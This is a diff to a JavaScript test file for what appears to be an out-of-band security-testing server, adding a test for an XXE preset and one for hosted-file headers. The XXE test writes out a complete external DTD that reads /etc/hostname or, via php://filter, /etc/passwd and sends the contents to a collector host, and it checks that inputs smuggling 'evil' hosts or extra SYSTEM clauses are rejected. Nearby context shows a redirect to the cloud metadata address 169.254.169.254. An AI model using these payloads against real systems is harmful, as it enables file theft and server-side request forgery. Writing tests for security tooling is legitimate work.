@@ -10,7 +10,7 @@ import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
 import { PassThrough } from "node:stream";
-import { validateHttpRule, respond, serialize, describeRule, describeDecoy } from "../lib/rules.mjs";
+import { validateHttpRule, respond, serialize, describeRule, describeDecoy, xxeParts } from "../lib/rules.mjs";
 import { Reader, readHead, readBody, HttpError } from "../lib/http1.mjs";
 import { ownership, sniOf } from "../edge.mjs";
 
@@ -101,6 +101,33 @@ test("rules: a HEAD decoy, and the exit redirect records where it pointed", () =
   assert.deepEqual(exit.answer, { by: "colluder", mode: "redirect", version: 1, hop: 2, code: 302, to: "169.254.169.254" });
   assert.equal(describeDecoy(rule.decoy), "HEAD requests");
   assert.equal(validateHttpRule({ mode: "custom", decoy: { methods: "GET; rm" } }).error, "Decoy methods must be up to 4 HTTP methods, like HEAD.");
+});
+
+test("rules: the XXE preset answers by path; everything else gets the default reply", () => {
+  const host = `fetch.${ID}.${DOMAIN}`;
+  const { rule } = validateHttpRule({ mode: "preset", kind: "xxe", params: { host, file: "/etc/hostname" } });
+  const req = (scheme, target, h = `kx1.${host}`) => ({ scheme, method: "GET", target, host: h, uniqueId: ID, domain: DOMAIN });
+  const dtd = respond(rule, 1, req("http", "/x.dtd"));
+  assert.equal(dtd.answer.part, "x.dtd");
+  assert.equal(dtd.headers.find(([n]) => n === "Content-Type")[1], "application/xml-dtd");
+  assert.equal(dtd.body.toString(), `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kx0.${host}/d?d=%file;'>">\n%eval;\n%exfil;\n`);
+  assert.equal(respond(rule, 1, req("https", "/fetch/k/kx6/x.dtd", `${ID}.${DOMAIN}`)).answer.part, "x.dtd", "HTTPS, tag in the path");
+  assert.match(respond(rule, 1, req("http", "/feed.xml")).body.toString(), new RegExp(`<!DOCTYPE rss SYSTEM "http://kx0\\.${host.replace(/\./g, "\\.")}/x\\.dtd">`));
+  const data = respond(rule, 1, req("http", "/d?d=user", `kx0.${host}`));
+  assert.equal(data.answer.part, undefined);
+  assert.match(data.body.toString(), /<html>/, "exfil lands on the default reply");
+  assert.equal(xxeParts({ host, file: "php://filter/convert.base64-encode/resource=/etc/passwd" })["x.dtd"].body.split("\n")[0], `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`);
+  assert.equal(describeRule(rule).line, "an XXE DTD reading /etc/hostname, plus feed.xml and sitemap.xml");
+  for (const file of ['/etc/x" SYSTEM "http://evil/', "/etc/a b", "/etc/%x", "http://evil/x"]) assert.match(validateHttpRule({ mode: "preset", kind: "xxe", params: { host, file } }).error, /^File must be/, file);
+  assert.match(validateHttpRule({ mode: "preset", kind: "xxe", params: { host: "evil.com", file: "/etc/hostname" } }).error, /^Preset host/);
+  assert.match(validateHttpRule({ mode: "preset", kind: "nope", params: {} }).error, /^Preset must be/);
+});
+
+test("rules: a hosted file can carry extra headers", () => {
+  const { rule } = validateHttpRule({ mode: "file", contentType: "text/javascript", body: "x", headers: [["Access-Control-Allow-Origin", "*"]] });
+  const r = respond(rule, 1, { scheme: "https", method: "GET", target: "/t/c.js", host: `${ID}.${DOMAIN}`, uniqueId: ID, domain: DOMAIN });
+  assert.deepEqual(r.headers.slice(0, 3), [["Connection", "close"], ["Content-Type", "text/javascript"], ["Access-Control-Allow-Origin", "*"]]);
+  assert.match(validateHttpRule({ mode: "file", headers: [["Content-Length", "1"]] }).error, /set by the edge/);
 });
 
 test("rules: custom and file answers; HEAD gets no body; scheme switch falls back to default", () => {
